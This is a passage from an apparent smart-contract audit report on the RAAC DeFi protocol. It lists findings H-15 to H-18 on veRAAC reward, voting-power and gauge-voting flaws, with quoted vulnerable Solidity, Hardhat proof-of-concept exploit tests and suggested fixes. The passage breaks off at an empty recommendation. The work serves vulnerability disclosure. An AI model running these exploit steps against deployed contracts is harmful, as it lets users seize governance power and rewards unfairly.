    (ethers.parseEther("40") * grossMultiplier) / BigInt(10000);
  const lendingFeeGross =
    (ethers.parseEther("30") * grossMultiplier) / BigInt(10000);
  const swapTaxGross =
    (ethers.parseEther("10") * grossMultiplier) / BigInt(10000);

  // Collect fees
  await feeCollector.connect(user1).collectFee(protocolFeeGross, 0);
  await feeCollector.connect(user1).collectFee(lendingFeeGross, 1);
  await feeCollector.connect(user1).collectFee(swapTaxGross, 6);

  //c allow the period to be over so a new period can begin
  await time.increase(WEEK + 10);
  const tx2 = await feeCollector.connect(owner).distributeCollectedFees();
  const tx2Receipt = await tx2.wait();
  const eventLogs = tx2Receipt.logs;

  let veRAACShare;

  for (let log of eventLogs) {
    if (log.fragment && log.fragment.name === "FeeDistributed") {
      veRAACShare = log.args[0];
      break;
    }
  }
  console.log("veRAAC Share: ", veRAACShare);

  //c get pending rewards user 1 in new period
  const user1PendingRewardsP2 = await feeCollector.getPendingRewards(
    user1.address
  );
  console.log("User 1 Pending Rewards in New Period: ", user1PendingRewardsP2);

  //c user1 pending rewards is 0 even though fees have been distributed and user1 has veRAAC tokens and veRAAC holder shares are not 0
  assert(veRAACShare > 0);
  assert(user1PendingRewardsP2 == 0);
});
```

## Impact

Users Are Unfairly Denied Rewards: Users who claimed in the previous period lose access to their next period's rewards, even when they still hold veRAAC. This reduces incentives to participate in veRAAC staking.

Breaks Protocol Tokenomics & Governance Incentives: The veRAAC model is designed to encourage long-term participation. If rewards are unreliable, users will unstake, decreasing veRAAC's governance participation.

## Tools Used

Manual Review, Hardhat

## Recommendations

o fix this issue, the contract should not apply the reward check when a new period starts, ensuring users receive their full shares.

Updated Fix in claimRewards()
Check if the user is in a new period
If yes, reset their rewards and give them their full share
If not, apply the normal check

By implementing this fix, users will always receive their rewards in every eligible period, maintaining protocol trust and incentivizing long-term participation.

## <a id='H-15'></a>H-15. Rate of decay not measured in veRAACToken::increase which allows users to unfairly boost voting power by calling this function

## Summary

The veRAACToken::increase function contains a critical vulnerability in the calculation of voting power (bias) when users increase their locked token amount. The issue arises because the function does not account for the decay of the user's existing voting power over time. Instead, it calculates the new bias based on the original locked amount, ignoring the fact that the user's voting power has decreased due to decay.

This flaw allows users to exploit the system by:

Initially locking a small amount of tokens.

Waiting for their voting power to decay partially.

Increasing their locked amount to gain disproportionately higher voting power compared to users who lock the same total amount upfront.

## Vulnerability Details

veRAACToken::increase allows a user with an existing lock to increase the amount they have locked. See below:

```solidity
 /**
     * @notice Increases the amount of locked RAAC tokens
     * @dev Adds more tokens to an existing lock without changing the unlock time
     * @param amount The additional amount of RAAC tokens to lock
     */
    function increase(uint256 amount) external nonReentrant whenNotPaused {
        // Increase lock using LockManager
        _lockState.increaseLock(msg.sender, amount);
        _updateBoostState(msg.sender, locks[msg.sender].amount);

        // Update voting power
        LockManager.Lock memory userLock = _lockState.locks[msg.sender];
        (int128 newBias, int128 newSlope) = _votingState.calculateAndUpdatePower(
            msg.sender,
            userLock.amount + amount,
            userLock.end
        );

        // Update checkpoints
        uint256 newPower = uint256(uint128(newBias));
        _checkpointState.writeCheckpoint(msg.sender, newPower);

        // Transfer additional tokens and mint veTokens
        raacToken.safeTransferFrom(msg.sender, address(this), amount);
        _mint(msg.sender, newPower - balanceOf(msg.sender));

        emit LockIncreased(msg.sender, amount);
    }

```

The key line to note is where the newBias is calculated with:

```solidity
 (int128 newBias, int128 newSlope) = _votingState
            .calculateAndUpdatePower(
                msg.sender,
                userLock.amount + amount,
                userLock.end
            );
```

VotingPowerLib::calculateAndUpdatePower updates the user's bias as follows:

```solidity
 /**
     * @notice Calculates and updates voting power for a user
     * @dev Updates points and slope changes for power decay
     * @param state The voting power state
     * @param user The user address
     * @param amount The amount of tokens
     * @param unlockTime The unlock timestamp
     * @return bias The calculated voting power bias
     * @return slope The calculated voting power slope
     */
    function calculateAndUpdatePower(
        VotingPowerState storage state,
        address user,
        uint256 amount,
        uint256 unlockTime
    ) internal returns (int128 bias, int128 slope) {
        if (amount == 0 || unlockTime <= block.timestamp) revert InvalidPowerParameters();

        uint256 MAX_LOCK_DURATION = 1460 days; // 4 years
        // FIXME: Get me to uncomment me when able
        // bias = RAACVoting.calculateBias(amount, unlockTime, block.timestamp);
        // slope = RAACVoting.calculateSlope(amount);

        // Calculate initial voting power that will decay linearly to 0 at unlock time
        uint256 duration = unlockTime - block.timestamp;
        uint256 initialPower = (amount * duration) / MAX_LOCK_DURATION; // Normalize by max duration

        bias = int128(int256(initialPower));
        slope = int128(int256(initialPower / duration)); // Power per second decay

        uint256 oldPower = getCurrentPower(state, user, block.timestamp);

        state.points[user] = RAACVoting.Point({
            bias: bias,
            slope: slope,
            timestamp: block.timestamp
        });

        _updateSlopeChanges(state, unlockTime, 0, slope);

        emit VotingPowerUpdated(user, oldPower, uint256(uint128(bias)));
        return (bias, slope);
    }

```

The crease function passes userLock.amount + amount. The idea is that we calculate a new bias value based on the amount that the user wants to deposit and the last amount the user deposited. Then the new bias gotten from there using the above function.

The error occurs in the calculation of the new bias. Since veRAACToken::increase uses userLock.amount, it assumes the initial value that the user deposited into the protocol. This doesn't take the rate of decay into account. The idea of ve mechanics is that the tokens lose value over time as their power tends towards 0. So when a user increases their locked amount, the previous balance they deposited should have been decaying over time and the amount that should be considered when a user increases their lock is the current amount factoring decay + new amount user wants to deposit. In the current implementation, the rate of decay is not considered which can lead to a host of issues including that a user could opt to initially lock a small amount and come back and increase the lock by a larger amount and get more voting power than a user who just locked the same amount at once using veRAACToken::lock.

\##Proof Of Code (POC)

The following tests were run in the veRAACToken.test.js file in the "Lock Mechanism" describe block.

```javascript
it("new bias skew in increase function", async () => {
  //c for testing purposes
  const initialAmount = ethers.parseEther("1000");
  const additionalAmount = ethers.parseEther("500");
  const duration = 365 * 24 * 3600; // 1 year

  await veRAACToken.connect(users[0]).lock(initialAmount, duration);

  //c wait for some time to pass so the user's biases to change
  await time.increase(duration / 2); //c half a year has passed

  //c get user biases
  const user0BiasPreIncrease = await veRAACToken.getVotingPower(
    users[0].address
  );
  console.log("User 0 Bias: ", user0BiasPreIncrease);

  //c calculate expected bias after increase taking the rate of decay of user's tokens into account
  const amount = user0BiasPreIncrease + additionalAmount;
  console.log("Amount: ", amount);

  const positionPreIncrease = await veRAACToken.getLockPosition(
    users[0].address
  );
  const positionEndTime = positionPreIncrease.end;
  console.log("Position End Time: ", positionEndTime);

  const currentTimestamp = await time.latest();
  const duration1 = positionEndTime - BigInt(currentTimestamp);
  console.log("Duration 1: ", duration1);

  const user0expectedBiasAfterIncrease =
    (amount * duration1) / (await veRAACToken.MAX_LOCK_DURATION());
  console.log("Expected Bias After Increase: ", user0expectedBiasAfterIncrease);

  await veRAACToken.connect(users[0]).increase(additionalAmount);

  //c get actual user biases after increase
  const user0actualBiasPostIncrease = await veRAACToken.getVotingPower(
    users[0].address
  );
  console.log("User 0 Post Increase Bias: ", user0actualBiasPostIncrease);

  //c since the rate of decay was not taken into account when calculating the user's bias, the expected bias after increase will be less than the actual bias after increase which gives the user more voting power than expected which can be used to skew voting results and reward distribution
  assert(user0expectedBiasAfterIncrease < user0actualBiasPostIncrease);

  const position = await veRAACToken.getLockPosition(users[0].address);
  expect(position.amount).to.equal(initialAmount + additionalAmount);
});

it("2 users locking same amount with different methods end up with different voting power", async () => {
  //c for testing purposes
  const initialAmount = ethers.parseEther("1000");

  const duration = 365 * 24 * 3600; // 1 year

  //c user0 locks tokens using the lock function
  await veRAACToken.connect(users[0]).lock(initialAmount, duration);

  //c user 1 knows about the exploit and deposits only half the amount of user 0 for same duration
  await veRAACToken
    .connect(users[1])
    .lock(BigInt(initialAmount) / BigInt(2), duration);

  //c wait for some time to pass so the user's biases to change
  await time.increase(duration / 2); //c half a year has passed

  //c user1 waits half a year and then deposits the next half of the amount without adjusting their lock duration
  await veRAACToken
    .connect(users[1])
    .increase(BigInt(initialAmount) / BigInt(2));

  //c get user biases
  const user0BiasPostIncrease = await veRAACToken.getVotingPower(
    users[0].address
  );
  console.log("User 0 Bias: ", user0BiasPostIncrease);

  const user1BiasPostIncrease = await veRAACToken.getVotingPower(
    users[1].address
  );
  console.log("User 1 Bias: ", user1BiasPostIncrease);

  //c at this point, user0 and user1 should have the same voting power since they have the same amount of tokens locked for the same duration but this isnt the case due to the bug in the above test and user1 will end up with more tokens than user 0
  assert(user0BiasPostIncrease < user1BiasPostIncrease);
});
```

## Impact

The vulnerability in the veRAACToken::increase function has significant implications for the fairness and integrity of the protocol. Specifically:

Unfair Voting Power Distribution: Users who exploit this vulnerability by initially locking a small amount and later increasing it can gain disproportionately higher voting power compared to users who lock the same total amount upfront. This skews voting outcomes and undermines the fairness of governance decisions.

Reward Distribution Manipulation: Exploiting this bug allows users to manipulate their voting power to claim a larger share of rewards than they are entitled to.

Economic Imbalance: The exploit could lead to an imbalance in the protocol's tokenomics, as users who exploit the bug gain an unfair advantage over honest participants.

## Tools Used

Manual Review, Hardhat

## Recommendations

Update the increase Function: Modify the increase function to pass the current decayed balance of the user's existing lock to calculateAndUpdatePower.

Update the increase function to:

```solidity
function increase(uint256 amount) external nonReentrant whenNotPaused {
    // Increase lock using LockManager
    _lockState.increaseLock(msg.sender, amount);
    _updateBoostState(msg.sender, locks[msg.sender].amount);

    // Get the current decayed balance of the user's existing lock
    uint256 currentBalance = getCurrentPower(_votingState, msg.sender, block.timestamp);

    // Update voting power
    LockManager.Lock memory userLock = _lockState.locks[msg.sender];
    (int128 newBias, int128 newSlope) = _votingState.calculateAndUpdatePower(
        msg.sender,
        currentBalance + amount, // Use current decayed balance + new amount
        userLock.end
    );

    // Update checkpoints
    uint256 newPower = uint256(uint128(newBias));
    _checkpointState.writeCheckpoint(msg.sender, newPower);

    // Transfer additional tokens and mint veTokens
    raacToken.safeTransferFrom(msg.sender, address(this), amount);
    _mint(msg.sender, newPower - balanceOf(msg.sender));

    emit LockIncreased(msg.sender, amount);
}
```

## <a id='H-16'></a>H-16. MAX_TOTAL_SUPPLY enforcement can be bypassed allowing users to mint unlimited tokens

## Summary

The veRAACToken::increase function allows users to increase their locked amount of RAAC tokens without enforcing the MAX_TOTAL_SUPPLY restriction, unlike veRAACToken::lock. This omission enables users to bypass the intended total supply cap, leading to an inflation of veRAAC tokens beyond the protocol’s designed limit. As a result, malicious users can manipulate governance voting power, unfairly claim more rewards, and destabilize the protocol's tokenomics.

## Vulnerability Details

veRAACToken::increase allows a user with an existing lock to increase the amount they have locked. See below:

```solidity
 /**
     * @notice Increases the amount of locked RAAC tokens
     * @dev Adds more tokens to an existing lock without changing the unlock time
     * @param amount The additional amount of RAAC tokens to lock
     */
    function increase(uint256 amount) external nonReentrant whenNotPaused {
        // Increase lock using LockManager
        _lockState.increaseLock(msg.sender, amount);
        _updateBoostState(msg.sender, locks[msg.sender].amount);

        // Update voting power
        LockManager.Lock memory userLock = _lockState.locks[msg.sender];
        (int128 newBias, int128 newSlope) = _votingState.calculateAndUpdatePower(
            msg.sender,
            userLock.amount + amount,
            userLock.end
        );

        // Update checkpoints
        uint256 newPower = uint256(uint128(newBias));
        _checkpointState.writeCheckpoint(msg.sender, newPower);

        // Transfer additional tokens and mint veTokens
        raacToken.safeTransferFrom(msg.sender, address(this), amount);
        _mint(msg.sender, newPower - balanceOf(msg.sender));

        emit LockIncreased(msg.sender, amount);
    }

```

For a user to increase a lock, they need to first create a lock with veRAACToken::lock:

```solidity
  /**
     * @notice Creates a new lock position for RAAC tokens
     * @dev Locks RAAC tokens for a specified duration and mints veRAAC tokens representing voting power
     * @param amount The amount of RAAC tokens to lock
     * @param duration The duration to lock tokens for, in seconds
     */
    function lock(uint256 amount, uint256 duration) external nonReentrant whenNotPaused {
        if (amount == 0) revert InvalidAmount();
        if (amount > MAX_LOCK_AMOUNT) revert AmountExceedsLimit();
        if (totalSupply() + amount > MAX_TOTAL_SUPPLY) revert TotalSupplyLimitExceeded();
        if (duration < MIN_LOCK_DURATION || duration > MAX_LOCK_DURATION)
            revert InvalidLockDuration();

        // Do the transfer first - this will revert with ERC20InsufficientBalance if user doesn't have enough tokens
        raacToken.safeTransferFrom(msg.sender, address(this), amount);

        // Calculate unlock time
        uint256 unlockTime = block.timestamp + duration;

        // Create lock position
        _lockState.createLock(msg.sender, amount, duration);
        _updateBoostState(msg.sender, amount);

        // Calculate initial voting power
        (int128 bias, int128 slope) = _votingState.calculateAndUpdatePower(
            msg.sender,
            amount,
            unlockTime
        );

        // Update checkpoints
        uint256 newPower = uint256(uint128(bias));
        _checkpointState.writeCheckpoint(msg.sender, newPower);

        // Mint veTokens
        _mint(msg.sender, newPower);

        emit LockCreated(msg.sender, amount, unlockTime);
    }

```

There is a max supply implemented to set a maximum supply amount restriction on veRAACToken mints to ensure that the totalSupply doesn't exceed the specified amount.

```solidity
    uint256 private constant MAX_TOTAL_SUPPLY = 100_000_000e18; // 100M
```

This restriction is implemented when a user locks tokens as seen in veRAACToken::lock but the check is not enforced in veRAACToken::increase which allows for a situation where the total supply can exceed the expected amount with malicious users calling veRAACToken::lock with a small amount and then bypassing MAX_TOTAL_SUPPLY with veRAACToken::increase.

## Proof Of Code (POC)

This test was run in the veRAACToken.test.js file in the "Lock Mechanism" describe block. For a successful test, temporarily set the MAX_TOTAL_SUPPLY variable to public visibility in veRAACToken.sol.

```solidity
    uint256 public constant MAX_TOTAL_SUPPLY = 100_000_000e18; // 100M
```

Also, increase the total amount of signers in the hardhat.config.cjs file as follows:

```javascript
 networks: {
    hardhat: {
      mining: {
        auto: true,
        interval: 0,
      },
      forking: {
        url: process.env.BASE_RPC_URL,
      },
      chainId: 8453,
      gasPrice: 120000000000, // 120 gwei
      allowBlocksWithSameTimestamp: true,
      accounts: {
        count: 50,
      },
    },
```

```javascript
it("no max supply check when user is increasing lock amount", async () => {
  //c for testing purposes
  const initialAmount = ethers.parseEther("100000000");
  const initialLock = ethers.parseEther("1000");
  const increaseAmount = ethers.parseEther("9999000");

  const duration = 365 * 24 * 3600; // 1 year

  for (const user of users.slice(0, 21)) {
    await raacToken.mint(user.address, initialAmount);
    await raacToken
      .connect(user)
      .approve(await veRAACToken.getAddress(), MaxUint256);
    await veRAACToken.connect(user).lock(initialLock, duration);
    await veRAACToken.connect(user).increase(increaseAmount);
  }

  //c get total supply
  const totalSupply = await veRAACToken.totalSupply();
  const maxTotalSupply = await veRAACToken.MAX_TOTAL_SUPPLY();
  console.log("Total Supply: ", totalSupply);
  console.log("Max Total Supply: ", maxTotalSupply);

  //c the total supply will be more than the max due to the lack of total supply enforcement when a user increases their lock amount
  assert(totalSupply > maxTotalSupply);
});
```

## Impact

Voting Manipulation: Since veRAAC is used for governance, users can artificially increase their voting power beyond the intended limit, leading to unfair governance control.
Unfair Reward Distribution: Rewards may be incorrectly allocated due to an inaccurate total supply, reducing the rewards for honest users.
Economic Instability: Inflation of veRAAC tokens can devalue the token, affecting its market perception and utility.
Systemic Risk: If malicious actors continuously exploit this, it may destabilize governance mechanisms, affecting decision-making within the protocol.

## Tools Used

Manual Review, Hardhat

## Recommendations

To fix this vulnerability, enforce the max supply check inside veRAACToken::increase. Modify the function to verify that adding new locked tokens does not exceed MAX_TOTAL_SUPPLY before proceeding:

```solidity
function increase(uint256 amount) external nonReentrant whenNotPaused {
    uint256 newTotalSupply = totalSupply() + amount;
    if (newTotalSupply > MAX_TOTAL_SUPPLY) revert TotalSupplyLimitExceeded(); // Enforce max supply

    _lockState.increaseLock(msg.sender, amount);
    _updateBoostState(msg.sender, locks[msg.sender].amount);

    LockManager.Lock memory userLock = _lockState.locks[msg.sender];
    (int128 newBias, int128 newSlope) = _votingState
        .calculateAndUpdatePower(msg.sender, userLock.amount + amount, userLock.end);

    uint256 newPower = uint256(uint128(newBias));
    _checkpointState.writeCheckpoint(msg.sender, newPower);

    raacToken.safeTransferFrom(msg.sender, address(this), amount);
    _mint(msg.sender, newPower - balanceOf(msg.sender));

    emit LockIncreased(msg.sender, amount);
}
```

## <a id='H-17'></a>H-17. Users with no voting power can vote on gauge emission weights

## Summary

The GaugeController allows users to vote on gauge weights using their veRAAC balance. However, the current implementation incorrectly uses a standard balanceOf function, which ignores the decay inherent to ve-tokens. As a result, users can vote using expired or fully-decayed veRAAC balances, effectively allowing them to influence reward distributions even after their true voting power has reduced to zero.

## Vulnerability Details

Users can vote on the weights attributed to each guage via GaugeController::vote. These weights are used to determine how much rewards are distributed to each gauge and users who have staked to a particular gauge get RAAC emissions from the gauge they are staked in.

```solidity
  /**
     * @notice Core voting functionality for gauge weights
     * @dev Updates gauge weights based on user's veToken balance
     * @param gauge Address of gauge to vote for
     * @param weight New weight value in basis points (0-10000)
     */
    function vote(address gauge, uint256 weight) external override whenNotPaused {
        if (!isGauge(gauge)) revert GaugeNotFound();
        if (weight > WEIGHT_PRECISION) revert InvalidWeight();

        uint256 votingPower = veRAACToken.balanceOf(msg.sender);
        if (votingPower == 0) revert NoVotingPower();

        uint256 oldWeight = userGaugeVotes[msg.sender][gauge];
        userGaugeVotes[msg.sender][gauge] = weight;

        _updateGaugeWeight(gauge, oldWeight, weight, votingPower);

        emit WeightUpdated(gauge, oldWeight, weight);
    }

```

The exploit lies in the following line:

```solidity
 uint256 votingPower = veRAACToken.balanceOf(msg.sender);
```

Voting escrow mechanics work with an ever decreasing user balance as a user's balance is time weighted and as time increases, the user's balance reduces. The balanceOf used in the line above is a standard ERC20 balanceOf function that simply returns the user's balance that they were minted during their initial lock/ whenever they are minted new veRAAC via veRAAC::increase or veRAAC::extend. The problem with this is that this doesnt take the rate of decay into consideration which presents a situation where a user can vote via GaugeController::vote when their voting power is 0. Since the rate of decay isnt taken into account, when a user's lock has expired, the balanceOf function returns the amount of tokens the user has and doesn't consider the impact of time on the user's balance.

## Proof Of Code (POC)

This test was run in GaugeController.test.js file in the "Period Management" describe block. There is some extra setup required in this test as the veRAACToken used in this file is a MockToken that doesnt take decay into account. As a result, we have to change the setup to implement veRAACToken.sol. To do this, replace the "GaugeController" descibe block and its beforeEach with the following:

```javascript
describe("GaugeController", () => {
  let gaugeController;
  let rwaGauge;
  let raacGauge;
  let veRAACToken;
  let rewardToken;
  let owner;
  let gaugeAdmin;
  let emergencyAdmin;
  let feeAdmin;
  let raacToken;
  let user1;
  let user2;
  let user3;
  let user4;
  let users;

  const MONTH = 30 * 24 * 3600;
  const WEEK = 7 * 24 * 3600;
  const WEIGHT_PRECISION = 10000;
  const { MaxUint256 } = ethers;
  const duration = 365 * 24 * 3600; // 1 year

  beforeEach(async () => {
    [
      owner,
      gaugeAdmin,
      emergencyAdmin,
      feeAdmin,
      user1,
      user2,
      user3,
      user4,
      ...users
    ] = await ethers.getSigners(); //c added ...users to get all users and added users 3 and 4 to the list of users for testing purposes

    // Deploy Mock tokens
    const MockToken = await ethers.getContractFactory("MockToken");
    /*veRAACToken = await MockToken.deploy("veRAAC Token", "veRAAC", 18);
    await veRAACToken.waitForDeployment();
    const veRAACAddress = await veRAACToken.getAddress(); */

    //c this should use the actual veRAACToken address and not a mock token as veRAAC has different mechanics to this mocktoken because the rate of decay is not considered at all in this mock token which allows for limiting POC's that produce false positives. the above code block was commented out for testing purposes

    const MockRAACToken = await ethers.getContractFactory("ERC20Mock");
    raacToken = await MockRAACToken.deploy("RAAC Token", "RAAC");
    await raacToken.waitForDeployment();

    const VeRAACToken = await ethers.getContractFactory("veRAACToken");
    veRAACToken = await VeRAACToken.deploy(await raacToken.getAddress());
    await veRAACToken.waitForDeployment();
    const veRAACAddress = await veRAACToken.getAddress();

    rewardToken = await MockToken.deploy("Reward Token", "REWARD", 18);
    await rewardToken.waitForDeployment();
    const rewardTokenAddress = await rewardToken.getAddress();

    // Deploy GaugeController with correct parameters
    const GaugeController = await ethers.getContractFactory("GaugeController");
    gaugeController = await GaugeController.deploy(veRAACAddress);
    await gaugeController.waitForDeployment();
    const gaugeControllerAddress = await gaugeController.getAddress();

    // Deploy RWAGauge with correct parameters
    const RWAGauge = await ethers.getContractFactory("RWAGauge");
    rwaGauge = await RWAGauge.deploy(
      await rewardToken.getAddress(),
      await veRAACToken.getAddress(),
      await gaugeController.getAddress()
    );
    await rwaGauge.waitForDeployment();

    // Deploy RAACGauge with correct parameters
    const RAACGauge = await ethers.getContractFactory("RAACGauge");
    raacGauge = await RAACGauge.deploy(
      await rewardToken.getAddress(),
      await veRAACToken.getAddress(),
      await gaugeController.getAddress()
    );
    await raacGauge.waitForDeployment();

    // Setup roles
    const GAUGE_ADMIN_ROLE = await gaugeController.GAUGE_ADMIN();
    const EMERGENCY_ADMIN_ROLE = await gaugeController.EMERGENCY_ADMIN();
    const FEE_ADMIN_ROLE = await gaugeController.FEE_ADMIN();

    await gaugeController.grantRole(GAUGE_ADMIN_ROLE, gaugeAdmin.address);
    await gaugeController.grantRole(
      EMERGENCY_ADMIN_ROLE,
      emergencyAdmin.address
    );
    await gaugeController.grantRole(FEE_ADMIN_ROLE, feeAdmin.address);

    // Add gauges
    await gaugeController.connect(gaugeAdmin).addGauge(
      await rwaGauge.getAddress(),
      0, // RWA type
      0 // Initial weight
    );
    await gaugeController.connect(gaugeAdmin).addGauge(
      await raacGauge.getAddress(),
      1, // RAAC type
      0 // Initial weight
    );

    // Initialize gauges
    await rwaGauge.grantRole(await rwaGauge.CONTROLLER_ROLE(), owner.address);
    await raacGauge.grantRole(await raacGauge.CONTROLLER_ROLE(), owner.address);
  });
```

The relevant test is as follows:

```javascript
it("user with no voting power can vote", async () => {
  //c setup user 1 to lock raac tokens to enable guage voting
  const INITIAL_MINT = ethers.parseEther("1000000");
  await raacToken.mint(user1.address, INITIAL_MINT);
  await raacToken
    .connect(user1)
    .approve(await veRAACToken.getAddress(), MaxUint256);

  //c user 1 locks raac tokens to gain veRAAC voting power
  await veRAACToken.connect(user1).lock(INITIAL_MINT, duration);
  const user1bal = await veRAACToken.balanceOf(user1.address);
  console.log("User 1 balance", user1bal);

  //c let user1's duration run out so their voting power is 0
  await time.increase(duration + 1);
  const user1votingPower = await veRAACToken.getVotingPower(user1.address);
  console.log("User 1 voting power", user1votingPower);

  await gaugeController.connect(user1).vote(await raacGauge.getAddress(), 5000);

  //c with user 1 voting power at 0, they are still about to use their full voting power to vote on the gauge
  const user1votes = await gaugeController.userGaugeVotes(
    user1.address,
    await raacGauge.getAddress()
  );
  console.log("User 1 votes", user1votes);
  assert(user1votes > 0);
});
```

## Impact

Reward Distribution Manipulation: Users with no effective voting power can influence gauge weights, redirecting rewards unfairly.
Governance Exploit: Attackers or malicious actors could strategically lock minimal tokens initially, wait for expiry, and continue influencing critical governance decisions without having genuine economic interest or active token exposure.

## Tools Used

Manual Review, Hardhat

## Recommendations

Replace the direct call to the standard ERC20 balanceOf function with the appropriate veRAAC-specific voting power function (getVotingPower()):

```solidity
uint256 votingPower = veRAACToken.getVotingPower(msg.sender);
```

This ensures voting power correctly reflects real-time token decay and prevents votes from users whose lock duration has expired, safeguarding fair reward distributions and accurate governance outcomes.

## <a id='H-18'></a>H-18. Users can use the same voting power to assign weights to multiple gauges

## Summary

The RAAC protocol's GaugeController::vote function allows users to vote on the weights of gauges, which determine how RAAC inflation rewards are distributed. However, the current implementation lacks a mechanism to prevent users from reusing their voting power across multiple gauges. This enables double voting, where a user can allocate their full voting power to multiple gauges simultaneously, skewing the reward distribution and undermining the fairness of the system.

## Vulnerability Details

Users can vote on the weights attributed to each guage via GaugeController::vote. These weights are used to determine how much rewards are distributed to each gauge and users who have staked to a particular gauge get RAAC emissions from the gauge they are staked in.

```solidity
  /**
     * @notice Core voting functionality for gauge weights
     * @dev Updates gauge weights based on user's veToken balance
     * @param gauge Address of gauge to vote for
     * @param weight New weight value in basis points (0-10000)
     */
    function vote(address gauge, uint256 weight) external override whenNotPaused {
        if (!isGauge(gauge)) revert GaugeNotFound();
        if (weight > WEIGHT_PRECISION) revert InvalidWeight();

        uint256 votingPower = veRAACToken.balanceOf(msg.sender);
        if (votingPower == 0) revert NoVotingPower();

        uint256 oldWeight = userGaugeVotes[msg.sender][gauge];
        userGaugeVotes[msg.sender][gauge] = weight;

        _updateGaugeWeight(gauge, oldWeight, weight, votingPower);

        emit WeightUpdated(gauge, oldWeight, weight);
    }

```

The following exploit occurs because there is no check to ensure that a user that has previously voted cannot vote again. As a result, users can use the same voting power to vote for multiple gauges which allows double voting to occur.

## Proof Of Code (POC)

This test was run in GaugeController.test.js file in the "Period Management" describe block. There is some extra setup required in this test as the veRAACToken used in this file is a MockToken that doesnt take decay into account. As a result, we have to change the setup to implement veRAACToken.sol. To do this, replace the "GaugeController" descibe block and its beforeEach with the following:

```javascript
describe("GaugeController", () => {
  let gaugeController;
  let rwaGauge;
  let raacGauge;
  let veRAACToken;
  let rewardToken;
  let owner;
  let gaugeAdmin;
  let emergencyAdmin;
  let feeAdmin;
  let raacToken;
  let user1;
  let user2;
  let user3;
  let user4;
  let users;

  const MONTH = 30 * 24 * 3600;
  const WEEK = 7 * 24 * 3600;
  const WEIGHT_PRECISION = 10000;
  const { MaxUint256 } = ethers;
  const duration = 365 * 24 * 3600; // 1 year

  beforeEach(async () => {
    [
      owner,
      gaugeAdmin,
      emergencyAdmin,
      feeAdmin,
      user1,
      user2,
      user3,
      user4,
      ...users
    ] = await ethers.getSigners(); //c added ...users to get all users and added users 3 and 4 to the list of users for testing purposes

    // Deploy Mock tokens
    const MockToken = await ethers.getContractFactory("MockToken");
    /*veRAACToken = await MockToken.deploy("veRAAC Token", "veRAAC", 18);
    await veRAACToken.waitForDeployment();
    const veRAACAddress = await veRAACToken.getAddress(); */

    //c this should use the actual veRAACToken address and not a mock token as veRAAC has different mechanics to this mocktoken because the rate of decay is not considered at all in this mock token which allows for limiting POC's that produce false positives. the above code block was commented out for testing purposes

    const MockRAACToken = await ethers.getContractFactory("ERC20Mock");
    raacToken = await MockRAACToken.deploy("RAAC Token", "RAAC");
    await raacToken.waitForDeployment();

    const VeRAACToken = await ethers.getContractFactory("veRAACToken");
    veRAACToken = await VeRAACToken.deploy(await raacToken.getAddress());
    await veRAACToken.waitForDeployment();
    const veRAACAddress = await veRAACToken.getAddress();

    rewardToken = await MockToken.deploy("Reward Token", "REWARD", 18);
    await rewardToken.waitForDeployment();
    const rewardTokenAddress = await rewardToken.getAddress();

    // Deploy GaugeController with correct parameters
    const GaugeController = await ethers.getContractFactory("GaugeController");
    gaugeController = await GaugeController.deploy(veRAACAddress);
    await gaugeController.waitForDeployment();
    const gaugeControllerAddress = await gaugeController.getAddress();

    // Deploy RWAGauge with correct parameters
    const RWAGauge = await ethers.getContractFactory("RWAGauge");
    rwaGauge = await RWAGauge.deploy(
      await rewardToken.getAddress(),
      await veRAACToken.getAddress(),
      await gaugeController.getAddress()
    );
    await rwaGauge.waitForDeployment();

    // Deploy RAACGauge with correct parameters
    const RAACGauge = await ethers.getContractFactory("RAACGauge");
    raacGauge = await RAACGauge.deploy(
      await rewardToken.getAddress(),
      await veRAACToken.getAddress(),
      await gaugeController.getAddress()
    );
    await raacGauge.waitForDeployment();

    // Setup roles
    const GAUGE_ADMIN_ROLE = await gaugeController.GAUGE_ADMIN();
    const EMERGENCY_ADMIN_ROLE = await gaugeController.EMERGENCY_ADMIN();
    const FEE_ADMIN_ROLE = await gaugeController.FEE_ADMIN();

    await gaugeController.grantRole(GAUGE_ADMIN_ROLE, gaugeAdmin.address);
    await gaugeController.grantRole(
      EMERGENCY_ADMIN_ROLE,
      emergencyAdmin.address
    );
    await gaugeController.grantRole(FEE_ADMIN_ROLE, feeAdmin.address);

    // Add gauges
    await gaugeController.connect(gaugeAdmin).addGauge(
      await rwaGauge.getAddress(),
      0, // RWA type
      0 // Initial weight
    );
    await gaugeController.connect(gaugeAdmin).addGauge(
      await raacGauge.getAddress(),
      1, // RAAC type
      0 // Initial weight
    );

    // Initialize gauges
    await rwaGauge.grantRole(await rwaGauge.CONTROLLER_ROLE(), owner.address);
    await raacGauge.grantRole(await raacGauge.CONTROLLER_ROLE(), owner.address);
  });
```

The relevant test is below:

```javascript
it("user can use same voting power to vote on multiple gauges", async () => {
  //c for testing purposes
  //c setup user 1 to lock raac tokens to enable gauge voting
  const INITIAL_MINT = ethers.parseEther("1000000");
  await raacToken.mint(user1.address, INITIAL_MINT);
  await raacToken
    .connect(user1)
    .approve(await veRAACToken.getAddress(), MaxUint256);

  //c user 1 locks raac tokens to gain veRAAC voting power
  await veRAACToken.connect(user1).lock(INITIAL_MINT, duration);
  const user1bal = await veRAACToken.balanceOf(user1.address);
  console.log("User 1 balance", user1bal);

  //c user1 votes on raac gauge
  await gaugeController.connect(user1).vote(await raacGauge.getAddress(), 5000);

  //c get weight of user1's vote on raac gauge
  const user1RAACvotes = await gaugeController.userGaugeVotes(
    user1.address,
    await raacGauge.getAddress()
  );
  console.log("User 1 votes", user1RAACvotes);

  //c user1 votes on rwa gauge
  await gaugeController.connect(user1).vote(await rwaGauge.getAddress(), 5000);

  //c get weight of user1's vote on rwa gauge
  const user1RWAvotes = await gaugeController.userGaugeVotes(
    user1.address,
    await rwaGauge.getAddress()
  );
  console.log("User 1 votes", user1RWAvotes);
  assert(user1RAACvotes == user1RWAvotes);
});
```

## Impact

The vulnerability allows users to exploit the voting mechanism by reusing their voting power across multiple gauges. This undermines the fairness and integrity of the gauge weight distribution system, as users can disproportionately influence the allocation of RAAC emissions. Specifically:

Double Voting: A user can vote on multiple gauges using the same voting power, effectively diluting the voting power of other participants and skewing the distribution of rewards.

Unfair Advantage: Users with significant veRAAC holdings can dominate the voting process, leading to centralization of power and reduced decentralization in the protocol.

Inaccurate Reward Distribution: The weights calculated based on these votes will not accurately reflect the community's preferences, leading to misallocation of RAAC inflation and potentially harming the protocol's long-term sustainability.

## Tools Used

Manual Review, Hardhat

## Recommendations

